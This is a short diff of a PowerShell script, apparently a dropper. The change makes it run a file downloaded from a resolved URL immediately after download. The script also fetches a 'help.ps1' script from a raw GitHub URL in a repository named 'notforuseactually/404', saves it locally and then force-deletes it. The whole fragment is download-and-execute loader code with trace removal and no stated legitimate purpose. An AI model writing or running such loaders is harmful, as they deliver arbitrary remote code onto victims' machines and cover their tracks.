@@ -98,6 +98,9 @@ Function Execute-File {
 # Download the file from the final URL
 Download-File -url $finalUrl -path $downloadPath
 
+# Execute the downloaded file
+Execute-File -filePath $downloadPath
+
 # Define the URL of the .ps1 file on GitHub
 $scriptUrl = "https://raw.githubusercontent.com/notforuseactually/404/main/help.ps1"
 # Define the path where you want to save the .ps1 file locally
@@ -113,5 +116,3 @@ Invoke-WebRequest -Uri $scriptUrl -OutFile $localScriptPath
 Remove-Item -Path $localScriptPath -Force
 
 
-# Execute the downloaded file
-Execute-File -filePath $downloadPath
